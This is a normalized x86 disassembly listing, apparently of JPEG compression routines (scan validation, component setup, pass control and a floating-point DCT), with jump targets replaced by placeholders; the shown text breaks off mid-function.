mov [ ebp - 0x18 ] eax
cmp [ ebp - 0x18 ] 0x0
jl r-xdata
jmp r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
mov [ eax + 0x14 ] 0x2d
mov ecx [ ebp + 0x8 ]
push ecx
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
call [ eax ]
add esp 0x4
jmp r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
mov [ edx + 0x14 ] 0x2d
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
call [ edx ]
add esp 0x4
cmp [ ebp - 0x1c ] 0x0
jne r-xdata
cmp [ ebp - 0x1c ] 0x0
jl r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov [ ecx + 0x14 ] 0x13
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
mov ecx [ ebp - 0x8 ]
mov [ eax + 0x18 ] ecx
mov edx [ ebp + 0x8 ]
push edx
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
call [ ecx ]
add esp 0x4
mov ecx [ ebp + 0x8 ]
mov edx [ ebp - 0x18 ]
cmp edx [ ecx + 0x3c ]
jl r-xdata
mov eax [ ebp - 0x10 ]
add eax 0x1
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x10 ]
add eax 0x1
mov [ ebp - 0x10 ] eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
mov [ edx + 0x14 ] 0x11
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov edx [ ebp - 0x8 ]
mov [ ecx + 0x18 ] edx
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
call [ edx ]
add esp 0x4
cmp [ ebp - 0x20 ] 0x3f
jne r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov [ ecx + 0x14 ] 0x11
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
mov ecx [ ebp - 0x8 ]
mov [ eax + 0x18 ] ecx
mov edx [ ebp + 0x8 ]
push edx
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
call [ ecx ]
add esp 0x4
cmp [ ebp - 0x1c ] 0x40
jge r-xdata
jmp r-xdata
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
mov ecx [ ebp - 0x18 ]
cmp ecx [ eax + edx * 4 ]
jg r-xdata
cmp [ ebp - 0x10 ] 0x0
jle r-xdata
mov ecx [ ebp - 0x10 ]
cmp ecx [ ebp - 0xc ]
jge r-xdata
cmp [ ebp - 0x24 ] 0x0
jne r-xdata
cmp [ ebp - 0xc ] 0x1
je r-xdata
cmp [ ebp - 0x20 ] 0x0
je r-xdata
mov edx [ ebp - 0x20 ]
cmp edx [ ebp - 0x1c ]
jl r-xdata
mov edx [ ebp - 0x10 ]
add edx 0x1
mov [ ebp - 0x10 ] edx
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
mov [ eax + 0x14 ] 0x13
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
mov eax [ ebp - 0x8 ]
mov [ edx + 0x18 ] eax
mov ecx [ ebp + 0x8 ]
push ecx
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
call [ eax ]
add esp 0x4
jmp r-xdata
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax + edx * 4 + 0x4 ]
mov [ ebp - 0x18 ] ecx
mov edx [ ebp - 0x18 ]
xor eax eax
mov al [ ebp + edx - 0x34 ]
test eax eax
je r-xdata
cmp [ ebp - 0x28 ] 0x0
je r-xdata
mov [ ebp - 0x10 ] 0x0
jmp r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
mov [ edx + 0x14 ] 0x11
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov edx [ ebp - 0x8 ]
mov [ ecx + 0x18 ] edx
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
call [ edx ]
add esp 0x4
jmp r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
mov [ eax + 0x14 ] 0x11
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
mov eax [ ebp - 0x8 ]
mov [ edx + 0x18 ] eax
mov ecx [ ebp + 0x8 ]
push ecx
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
call [ eax ]
add esp 0x4
cmp [ ebp - 0x20 ] 0x40
jge r-xdata
mov ecx [ ebp - 0x4 ]
add ecx 0x24
mov [ ebp - 0x4 ] ecx
mov edx [ ebp - 0x8 ]
add edx 0x1
mov [ ebp - 0x8 ] edx
mov eax [ ebp - 0x18 ]
mov [ ebp + eax - 0x34 ] 0x1
jmp r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
mov [ edx + 0x14 ] 0x13
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov edx [ ebp - 0x8 ]
mov [ ecx + 0x18 ] edx
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
call [ edx ]
add esp 0x4
mov [ ebp - 0x10 ] 0x0
jmp r-xdata
mov ecx [ ebp - 0x10 ]
cmp ecx [ ebp - 0xc ]
jge r-xdata
cmp [ ebp - 0x24 ] 0x0
jl r-xdata
mov eax [ ebp - 0x10 ]
add eax 0x1
mov [ ebp - 0x10 ] eax
jmp r-xdata
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax + edx * 4 + 0x4 ]
shl ecx 0x8
lea edx [ ebp + ecx - 0xa38 ]
mov [ ebp - 0x38 ] edx
cmp [ ebp - 0x1c ] 0x0
je r-xdata
cmp [ ebp - 0x24 ] 0xa
jg r-xdata
mov eax [ ebp - 0x1c ]
mov [ ebp - 0x14 ] eax
jmp r-xdata
mov eax [ ebp - 0x38 ]
cmp [ eax ] 0x0
jge r-xdata
cmp [ ebp - 0x28 ] 0x0
jl r-xdata
mov edx [ ebp - 0x14 ]
cmp edx [ ebp - 0x20 ]
jg r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
mov [ edx + 0x14 ] 0x11
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov edx [ ebp - 0x8 ]
mov [ ecx + 0x18 ] edx
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
call [ edx ]
add esp 0x4
cmp [ ebp - 0x28 ] 0xa
jle r-xdata
jmp r-xdata
mov eax [ ebp - 0x14 ]
mov ecx [ ebp - 0x38 ]
cmp [ ecx + eax * 4 ] 0x0
jge r-xdata
cmp [ ebp - 0x1c ] 0x0
jne r-xdata
mov eax [ ebp - 0x10 ]
add eax 0x1
mov [ ebp - 0x10 ] eax
mov ecx [ ebp - 0x14 ]
mov edx [ ebp - 0x38 ]
mov eax [ ebp - 0x24 ]
cmp eax [ edx + ecx * 4 ]
jne r-xdata
cmp [ ebp - 0x24 ] 0x0
je r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
mov [ eax + 0x14 ] 0x11
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
mov eax [ ebp - 0x8 ]
mov [ edx + 0x18 ] eax
mov ecx [ ebp + 0x8 ]
push ecx
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
call [ eax ]
add esp 0x4
mov ecx [ ebp - 0x24 ]
sub ecx 0x1
cmp [ ebp - 0x28 ] ecx
je r-xdata
jmp r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
mov [ eax + 0x14 ] 0x11
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
mov eax [ ebp - 0x8 ]
mov [ edx + 0x18 ] eax
mov ecx [ ebp + 0x8 ]
push ecx
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
call [ eax ]
add esp 0x4
mov ecx [ ebp - 0x14 ]
add ecx 0x1
mov [ ebp - 0x14 ] ecx
mov ecx [ ebp - 0x14 ]
mov edx [ ebp - 0x38 ]
mov eax [ ebp - 0x28 ]
mov [ edx + ecx * 4 ] eax
jmp r-xdata
sub_4337c0
push ebp
mov ebp esp
sub esp 0x48
push ebx
push esi
push edi
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x13c ]
mov [ ebp - 0x4 ] ecx
mov edx [ ebp - 0x4 ]
mov eax [ edx + 0x10 ]
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov ecx [ ebp + 0x8 ]
push ecx
call sub_433a60
add esp 0x4
mov edx [ ebp + 0x8 ]
push edx
call sub_433bf0
add esp 0x4
mov eax [ ebp + 0x8 ]
xor ecx ecx
mov cl [ eax + 0xb0 ]
test ecx ecx
jne r-xdata
cmp [ ebp - 0x8 ] 0x1
je r-xdata
mov edx [ ebp + 0x8 ]
push edx
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x158 ]
call [ ecx ]
add esp 0x4
mov edx [ ebp + 0x8 ]
mov al [ edx + 0xb2 ]
push eax
mov ecx [ ebp + 0x8 ]
push ecx
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x15c ]
call [ eax ]
add esp 0x8
mov ecx [ ebp - 0x4 ]
xor edx edx
cmp [ ecx + 0x18 ] 0x1
setle dl
dec edx
and edx 0x3
push edx
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x148 ]
call [ edx ]
add esp 0x8
push 0x0
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x140 ]
call [ edx ]
add esp 0x8
mov eax [ ebp + 0x8 ]
xor ecx ecx
mov cl [ eax + 0xb2 ]
test ecx ecx
je r-xdata
mov edx [ ebp + 0x8 ]
push edx
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x150 ]
call [ ecx ]
add esp 0x4
mov edx [ ebp + 0x8 ]
push edx
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x154 ]
call [ ecx ]
add esp 0x4
push 0x0
mov edx [ ebp + 0x8 ]
push edx
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x144 ]
call [ ecx ]
add esp 0x8
mov ecx [ ebp + 0x8 ]
push ecx
call sub_433a60
add esp 0x4
mov edx [ ebp + 0x8 ]
push edx
call sub_433bf0
add esp 0x4
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x12c ] 0x0
jne r-xdata
cmp [ ebp - 0x8 ] 0x2
je r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0xc ] 0x1
mov edx [ ebp - 0x4 ]
mov [ edx + 0xc ] 0x0
jmp r-xdata
push 0x1
mov ecx [ ebp + 0x8 ]
push ecx
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x15c ]
call [ eax ]
add esp 0x8
push 0x2
mov ecx [ ebp + 0x8 ]
push ecx
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x148 ]
call [ eax ]
add esp 0x8
mov ecx [ ebp - 0x4 ]
mov [ ecx + 0xc ] 0x0
jmp r-xdata
mov ecx [ ebp + 0x8 ]
cmp [ ecx + 0x134 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
xor ecx ecx
mov cl [ eax + 0xb2 ]
test ecx ecx
jne r-xdata
jmp r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ edx + 0x18 ]
sub eax 0x1
mov ecx [ ebp - 0x4 ]
xor edx edx
cmp [ ecx + 0x14 ] eax
sete dl
mov eax [ ebp - 0x4 ]
mov [ eax + 0xd ] dl
mov ecx [ ebp + 0x8 ]
cmp [ ecx + 0x8 ] 0x0
je r-xdata
jmp r-xdata
mov edx [ ebp + 0x8 ]
xor eax eax
mov al [ edx + 0xb1 ]
test eax eax
je r-xdata
push 0x0
mov ecx [ ebp + 0x8 ]
push ecx
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x15c ]
call [ eax ]
add esp 0x8
push 0x2
mov ecx [ ebp + 0x8 ]
push ecx
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x148 ]
call [ eax ]
add esp 0x8
mov ecx [ ebp - 0x4 ]
cmp [ ecx + 0x1c ] 0x0
jne r-xdata
mov edx [ ebp + 0x8 ]
push edx
call sub_433a60
add esp 0x4
mov eax [ ebp + 0x8 ]
push eax
call sub_433bf0
add esp 0x4
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov [ ecx + 0x14 ] 0x30
mov edx [ ebp + 0x8 ]
push edx
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
call [ ecx ]
add esp 0x4
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x8 ]
mov ecx [ ebp - 0x4 ]
mov edx [ ecx + 0x14 ]
mov [ eax + 0xc ] edx
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax [ edx + 0x18 ]
mov [ ecx + 0x10 ] eax
mov edx [ ebp - 0x4 ]
mov [ edx + 0x10 ] 0x2
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x14 ]
add ecx 0x1
mov edx [ ebp - 0x4 ]
mov [ edx + 0x14 ] ecx
mov edx [ ebp + 0x8 ]
push edx
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x14c ]
call [ ecx + 0x8 ]
add esp 0x4
mov edx [ ebp - 0x4 ]
mov [ edx + 0xc ] 0x0
jmp r-xdata
mov edx [ ebp + 0x8 ]
push edx
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x14c ]
call [ ecx + 0x4 ]
add esp 0x4
sub_433a60
push ebp
mov ebp esp
sub esp 0x4c
push ebx
push esi
push edi
mov eax [ ebp + 0x8 ]
cmp [ eax + 0xac ] 0x0
je r-xdata
mov edx [ ebp + 0x8 ]
cmp [ edx + 0x3c ] 0x4
jle r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x13c ]
mov [ ebp - 0x8 ] edx
mov eax [ ebp - 0x8 ]
mov ecx [ eax + 0x1c ]
imul ecx ecx 0x24
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0xac ]
add eax ecx
mov [ ebp - 0xc ] eax
mov ecx [ ebp + 0x8 ]
mov edx [ ebp - 0xc ]
mov eax [ edx ]
mov [ ecx + 0xe4 ] eax
mov [ ebp - 0x4 ] 0x0
jmp r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x3c ]
mov [ edx + 0xe4 ] ecx
mov [ ebp - 0x4 ] 0x0
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov [ ecx + 0x14 ] 0x1a
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x3c ]
mov [ eax + 0x18 ] edx
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov [ ecx + 0x1c ] 0x4
mov edx [ ebp + 0x8 ]
push edx
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
call [ ecx ]
add esp 0x4
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
cmp eax [ edx ]
jge r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x4 ]
cmp ecx [ eax + 0x3c ]
jge r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ ebp - 0xc ]
mov ecx [ eax + 0x14 ]
mov [ edx + 0x12c ] ecx
mov edx [ ebp + 0x8 ]
mov eax [ ebp - 0xc ]
mov ecx [ eax + 0x18 ]
mov [ edx + 0x130 ] ecx
mov edx [ ebp + 0x8 ]
mov eax [ ebp - 0xc ]
mov ecx [ eax + 0x1c ]
mov [ edx + 0x134 ] ecx
mov edx [ ebp + 0x8 ]
mov eax [ ebp - 0xc ]
mov ecx [ eax + 0x20 ]
mov [ edx + 0x138 ] ecx
jmp r-xdata
mov ecx [ ebp - 0x4 ]
mov edx [ ebp - 0xc ]
mov eax [ edx + ecx * 4 + 0x4 ]
imul eax eax 0x54
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x44 ]
add edx eax
mov eax [ ebp - 0x4 ]
mov ecx [ ebp + 0x8 ]
mov [ ecx + eax * 4 + 0xe8 ] edx
jmp r-xdata
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x12c ] 0x0
mov edx [ ebp + 0x8 ]
mov [ edx + 0x130 ] 0x3f
mov eax [ ebp + 0x8 ]
mov [ eax + 0x134 ] 0x0
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x138 ] 0x0
mov edx [ ebp - 0x4 ]
imul edx edx 0x54
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x44 ]
add ecx edx
mov edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov [ eax + edx * 4 + 0xe8 ] ecx
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x4 ]
add ecx 0x1
mov [ ebp - 0x4 ] ecx
mov edx [ ebp - 0x4 ]
add edx 0x1
mov [ ebp - 0x4 ] edx
sub_433bf0
push ebp
mov ebp esp
sub esp 0x58
push ebx
push esi
push edi
mov eax [ ebp + 0x8 ]
cmp [ eax + 0xe4 ] 0x1
jne r-xdata
mov edx [ ebp + 0x8 ]
cmp [ edx + 0xe4 ] 0x0
jle r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0xe8 ]
mov [ ebp - 0x10 ] edx
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x10 ]
mov edx [ ecx + 0x1c ]
mov [ eax + 0xf8 ] edx
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x10 ]
mov edx [ ecx + 0x20 ]
mov [ eax + 0xfc ] edx
mov eax [ ebp - 0x10 ]
mov [ eax + 0x34 ] 0x1
mov ecx [ ebp - 0x10 ]
mov [ ecx + 0x38 ] 0x1
mov edx [ ebp - 0x10 ]
mov [ edx + 0x3c ] 0x1
mov eax [ ebp - 0x10 ]
mov [ eax + 0x40 ] 0x8
mov ecx [ ebp - 0x10 ]
mov [ ecx + 0x44 ] 0x1
mov edx [ ebp - 0x10 ]
mov ecx [ ebp - 0x10 ]
mov eax [ edx + 0x20 ]
xor edx edx
div [ ecx + 0xc ]
mov [ ebp - 0xc ] edx
cmp [ ebp - 0xc ] 0x0
jne r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
mov [ edx + 0x14 ] 0x1a
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0xe4 ]
mov [ ecx + 0x18 ] eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
mov [ edx + 0x1c ] 0x4
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
call [ edx ]
add esp 0x4
mov eax [ ebp + 0x8 ]
cmp [ eax + 0xe4 ] 0x4
jle r-xdata
mov ecx [ ebp - 0x10 ]
mov edx [ ebp - 0xc ]
mov [ ecx + 0x48 ] edx
mov eax [ ebp + 0x8 ]
mov [ eax + 0x100 ] 0x1
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x104 ] 0x0
jmp r-xdata
mov edx [ ebp - 0x10 ]
mov eax [ edx + 0xc ]
mov [ ebp - 0xc ] eax
mov ecx [ ebp + 0x8 ]
mov edx [ ebp - 0x4 ]
cmp edx [ ecx + 0xe4 ]
jge r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0xd8 ]
shl ecx 0x3
push ecx
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x1c ]
push eax
call sub_420c70
add esp 0x8
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0xf8 ] eax
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0xdc ]
shl eax 0x3
push eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x20 ]
push edx
call sub_420c70
add esp 0x8
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0xfc ] eax
mov edx [ ebp + 0x8 ]
mov [ edx + 0x100 ] 0x0
mov [ ebp - 0x4 ] 0x0
jmp r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax + 0xc0 ] 0x0
jle r-xdata
mov eax [ ebp - 0x4 ]
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + eax * 4 + 0xe8 ]
mov [ ebp - 0x10 ] edx
mov eax [ ebp - 0x10 ]
mov ecx [ ebp - 0x10 ]
mov edx [ ecx + 0x8 ]
mov [ eax + 0x34 ] edx
mov eax [ ebp - 0x10 ]
mov ecx [ ebp - 0x10 ]
mov edx [ ecx + 0xc ]
mov [ eax + 0x38 ] edx
mov eax [ ebp - 0x10 ]
mov ecx [ ebp - 0x10 ]
mov edx [ eax + 0x34 ]
imul edx [ ecx + 0x38 ]
mov eax [ ebp - 0x10 ]
mov [ eax + 0x3c ] edx
mov ecx [ ebp - 0x10 ]
mov edx [ ecx + 0x34 ]
shl edx 0x3
mov eax [ ebp - 0x10 ]
mov [ eax + 0x40 ] edx
mov ecx [ ebp - 0x10 ]
mov esi [ ebp - 0x10 ]
mov eax [ ecx + 0x1c ]
xor edx edx
div [ esi + 0x34 ]
mov [ ebp - 0xc ] edx
cmp [ ebp - 0xc ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov ecx [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
mov eax [ ecx + 0xc0 ]
imul eax [ edx + 0xf8 ]
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x14 ] 0xffff
jge r-xdata
mov ecx [ ebp - 0x10 ]
mov edx [ ebp - 0xc ]
mov [ ecx + 0x44 ] edx
mov eax [ ebp - 0x10 ]
mov ecx [ ebp - 0x10 ]
mov eax [ eax + 0x20 ]
xor edx edx
div [ ecx + 0x38 ]
mov [ ebp - 0xc ] edx
cmp [ ebp - 0xc ] 0x0
jne r-xdata
mov edx [ ebp - 0x10 ]
mov eax [ edx + 0x34 ]
mov [ ebp - 0xc ] eax
mov [ ebp - 0x18 ] 0xffff
mov ecx [ ebp - 0x14 ]
mov [ ebp - 0x18 ] ecx
jmp r-xdata
mov ecx [ ebp - 0x10 ]
mov edx [ ebp - 0xc ]
mov [ ecx + 0x48 ] edx
mov eax [ ebp - 0x10 ]
mov ecx [ eax + 0x3c ]
mov [ ebp - 0x8 ] ecx
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x100 ]
add eax [ ebp - 0x8 ]
cmp eax 0xa
jle r-xdata
mov edx [ ebp - 0x10 ]
mov eax [ edx + 0x38 ]
mov [ ebp - 0xc ] eax
mov edx [ ebp + 0x8 ]
mov eax [ ebp - 0x18 ]
mov [ edx + 0xbc ] eax
mov eax [ ebp - 0x8 ]
mov ecx [ ebp - 0x8 ]
sub ecx 0x1
mov [ ebp - 0x8 ] ecx
test eax eax
jle r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
mov [ edx + 0x14 ] 0xd
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
call [ edx ]
add esp 0x4
jmp r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x100 ]
mov ecx [ ebp + 0x8 ]
mov edx [ ebp - 0x4 ]
mov [ ecx + eax * 4 + 0x104 ] edx
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x100 ]
add ecx 0x1
mov edx [ ebp + 0x8 ]
mov [ edx + 0x100 ] ecx
jmp r-xdata
mov eax [ ebp - 0x4 ]
add eax 0x1
mov [ ebp - 0x4 ] eax
sub_433ee0
push ebp
mov ebp esp
sub esp 0x40
push ebx
push esi
push edi
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x13c ]
mov [ ecx + 0xc ] 0x0
mov edx [ ebp + 0x8 ]
push edx
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x14c ]
call [ ecx + 0x4 ]
add esp 0x4
mov edx [ ebp + 0x8 ]
push edx
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x14c ]
call [ ecx + 0x8 ]
add esp 0x4
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_433f30
push ebp
mov ebp esp
sub esp 0x48
push ebx
push esi
push edi
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x13c ]
mov [ ebp - 0x4 ] ecx
mov edx [ ebp + 0x8 ]
push edx
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x15c ]
call [ ecx + 0x8 ]
add esp 0x4
mov edx [ ebp - 0x4 ]
mov eax [ edx + 0x10 ]
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov ecx [ ebp - 0x4 ]
mov [ ecx + 0x10 ] 0x2
mov edx [ ebp + 0x8 ]
xor eax eax
mov al [ edx + 0xb2 ]
test eax eax
jne r-xdata
cmp [ ebp - 0x8 ] 0x1
je r-xdata
jmp r-xdata
mov ecx [ ebp - 0x4 ]
mov edx [ ecx + 0x1c ]
add edx 0x1
mov eax [ ebp - 0x4 ]
mov [ eax + 0x1c ] edx
mov ecx [ ebp - 0x4 ]
mov [ ecx + 0x10 ] 0x2
jmp r-xdata
cmp [ ebp - 0x8 ] 0x2
je r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ edx + 0x14 ]
add eax 0x1
mov ecx [ ebp - 0x4 ]
mov [ ecx + 0x14 ] eax
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov edx [ ebp + 0x8 ]
xor eax eax
mov al [ edx + 0xb2 ]
test eax eax
je r-xdata
jmp r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ edx + 0x1c ]
add eax 0x1
mov ecx [ ebp - 0x4 ]
mov [ ecx + 0x1c ] eax
mov ecx [ ebp - 0x4 ]
mov [ ecx + 0x10 ] 0x1
sub_433ff0
push ebp
mov ebp esp
sub esp 0x94
push ebx
push esi
push edi
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x50 ] eax
mov [ ebp - 0x54 ] 0x7
jmp r-xdata
cmp [ ebp - 0x54 ] 0x0
jl r-xdata
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x50 ] eax
mov [ ebp - 0x54 ] 0x7
jmp r-xdata
mov edx [ ebp - 0x50 ]
mov eax [ ebp - 0x50 ]
fld [ edx ]
fadd [ eax + 0x1c ]
fstp [ ebp - 0x4 ]
mov ecx [ ebp - 0x50 ]
mov edx [ ebp - 0x50 ]
fld [ ecx ]
fsub [ edx + 0x1c ]
fstp [ ebp - 0x20 ]
mov eax [ ebp - 0x50 ]
mov ecx [ ebp - 0x50 ]
fld [ eax + 0x4 ]
fadd [ ecx + 0x18 ]
fstp [ ebp - 0x8 ]
mov edx [ ebp - 0x50 ]
mov eax [ ebp - 0x50 ]
fld [ edx + 0x4 ]
fsub [ eax + 0x18 ]
fstp [ ebp - 0x1c ]
mov ecx [ ebp - 0x50 ]
mov edx [ ebp - 0x50 ]
fld [ ecx + 0x8 ]
fadd [ edx + 0x14 ]
fstp [ ebp - 0xc ]
mov eax [ ebp - 0x50 ]
mov ecx [ ebp - 0x50 ]
fld [ eax + 0x8 ]
fsub [ ecx + 0x14 ]
fstp [ ebp - 0x18 ]
mov edx [ ebp - 0x50 ]
mov eax [ ebp - 0x50 ]
fld [ edx + 0xc ]
fadd [ eax + 0x10 ]
fstp [ ebp - 0x10 ]
mov ecx [ ebp - 0x50 ]
mov edx [ ebp - 0x50 ]
fld [ ecx + 0xc ]
fsub [ edx + 0x10 ]
fstp [ ebp - 0x14 ]
fld [ ebp - 0x4 ]
fadd [ ebp - 0x10 ]
fstp [ ebp - 0x24 ]
fld [ ebp - 0x4 ]
fsub [ ebp - 0x10 ]
fstp [ ebp - 0x30 ]
fld [ ebp - 0x8 ]
fadd [ ebp - 0xc ]
fstp [ ebp - 0x28 ]
fld [ ebp - 0x8 ]
fsub [ ebp - 0xc ]
fstp [ ebp - 0x2c ]
fld [ ebp - 0x24 ]
fadd [ ebp - 0x28 ]
mov eax [ ebp - 0x50 ]
fstp [ eax ]
fld [ ebp - 0x24 ]
fsub [ ebp - 0x28 ]
mov ecx [ ebp - 0x50 ]
fstp [ ecx + 0x10 ]
fld [ ebp - 0x2c ]
fadd [ ebp - 0x30 ]
fmul [ r--data ]
fstp [ ebp - 0x34 ]
fld [ ebp - 0x30 ]
fadd [ ebp - 0x34 ]
mov edx [ ebp - 0x50 ]
fstp [ edx + 0x8 ]
fld [ ebp - 0x30 ]
fsub [ ebp - 0x34 ]
mov eax [ ebp - 0x50 ]
fstp [ eax + 0x18 ]
fld [ ebp - 0x14 ]
fadd [ ebp - 0x18 ]
fstp [ ebp - 0x24 ]
fld [ ebp - 0x18 ]
fadd [ ebp - 0x1c ]
fstp [ ebp - 0x28 ]
fld [ ebp - 0x1c ]
fadd [ ebp - 0x20 ]
fstp [ ebp - 0x2c ]
fld [ ebp - 0x24 ]
fsub [ ebp - 0x2c ]
fmul [ r--data ]
fstp [ ebp - 0x44 ]
fld [ r--data ]
fmul [ ebp - 0x24 ]
fadd [ ebp - 0x44 ]
fstp [ ebp - 0x38 ]
fld [ r--data ]
fmul [ ebp - 0x2c ]
fadd [ ebp - 0x44 ]
fstp [ ebp - 0x40 ]
fld [ ebp - 0x28 ]
fmul [ r--data ]
fstp [ ebp - 0x3c ]
fld [ ebp - 0x20 ]
fadd [ ebp - 0x3c ]
fstp [ ebp - 0x48 ]
fld [ ebp - 0x20 ]
fsub [ ebp - 0x3c ]
fst [ ebp - 0x4c ]
fadd [ ebp - 0x38 ]
